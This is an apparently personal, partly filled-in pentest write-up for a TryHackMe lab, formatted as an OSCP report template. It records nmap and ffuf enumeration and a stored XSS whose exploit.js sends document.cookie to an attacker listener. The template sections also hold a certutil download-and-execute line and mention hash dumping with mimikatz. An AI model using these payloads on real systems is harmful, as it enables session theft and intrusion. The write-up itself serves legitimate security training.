---
Status: "#In-prgress"
OS:
ip:
Start_Time: 2026-02-07 15:47
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
	This time we only have a external site, so I started with a quick fully scan and verified that the target only has port 22 and 80 opened.
```bash
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
```

![[assets/Pasted image 20260207163621.png]]
	Next, I followed with a detailed service scan and normal script scan for all ports. The results shows that the target has a Nginx web server and the relevant ssh host keys.

![[assets/Pasted image 20260207163923.png]]
### 2.2 Directory enumeration
	Followed the service enumeration, I started gobuster and do a directory enumeration but nothing returned. So I used ffuf to do a virtual hosts enumeration.The results give me several possible hosts.
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.81.156.97/ -H "Host: FUZZ.k2.thm" -fs <content-length>
```

![[assets/Pasted image 20260207180320.png]]

![[assets/Pasted image 20260207180335.png]]

	
---

##  3. Initial access
### 3.1 XSS
	I tried to use XSS payload to test for petential xss vulnerabilties in the target it.k2.thm. In ticket submission place, it indeed has xss vulnerabilities.

![[assets/Pasted image 20260208115601.png]]

```
# XSS payload
<script src="http://.../exploit.js"></script>
```
```
# exploit.js
fetch('http://IP:8888/?cookie=' + document.cookie);
```
	I used this payload and file to steal the cookie and success.

![[assets/Pasted image 20260208120341.png]]
	After I decode the cookie, I tried to use to login. However, the cookie may be limited by some setting. I can't login with that cookie.

![[assets/Pasted image 20260209190010.png]]
	So I first tried to use xss to view the content of the dashboard. And it returned.

![[assets/Pasted image 20260209190359.png]]


##  4. Privilege Escalation

### 4.1 Local Enumeration
*Record findings from automated scripts and manual environment checks.*
- [ ] **Automated Tool:** Run [[PEASS-ng]] (winPEAS.exe / linpeas.sh).
- [ ] **Kernel Version:** `systeminfo` (Windows) or `uname -a` (Linux).
- [ ] **Sensitive Files:** Check for `.txt`, `.pdf`, `.zip` in user folders or web roots.
- [ ] **Misconfigurations:** (e.g., SUID, Sudo -l, Unquoted Service Paths, Token Impersonation).

### 4.2 Escalation Path
- **Vulnerability identified:** (e.g., CVE-2019-1388 UAC Bypass)
- **Exploitation Strategy:** (e.g., Abuse of Print Spooler service)

**Step-by-Step Reproduction:**
1. Upload exploit/script to the target: `certutil -urlcache -f http://<KALI_IP>/exploit.exe exploit.exe`
2. Execute the exploit:
```bash
# Final command to elevate to SYSTEM/root
.\exploit.exe
```

---

## 🏁 5. Post-Exploitation
### 5.1 Evidence Collection
*Commands to extract additional intelligence for reporting or pivoting.*
- **Dumping Hashes:** `secretsdump.py` or `mimikatz` (Optional for OSCP but good for practice).
- **History Files:** Check `.bash_history` (Linux) or `PowerShell_history` (Windows).
- **Installed Apps:** Check for non-standard software that might have vulnerabilities.

---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type     | Flag Content (Hash) | Screenshot (Link)   |
| :------------ | :------------------ | :------------------ |
| **local.txt** |                     | ![[local_flag.png]] |
| **proof.txt** |                     | ![[proof_flag.png]] |

---

## 💡 7. Remediation
*Professional advice for the client to secure the environment.*

### 7.1 Immediate Fixes
- **Vulnerability:** [e.g., Unquoted Service Path]
- **Fix:** [e.g., Wrap the service binary path in quotes or apply the relevant Windows patch].

### 7.2 Long-term Recommendations
- [ ] Implement a **Strong Password Policy** for all users (e.g., Wade in Retro).
- [ ] Schedule regular **Patch Management** for all web applications (WordPress).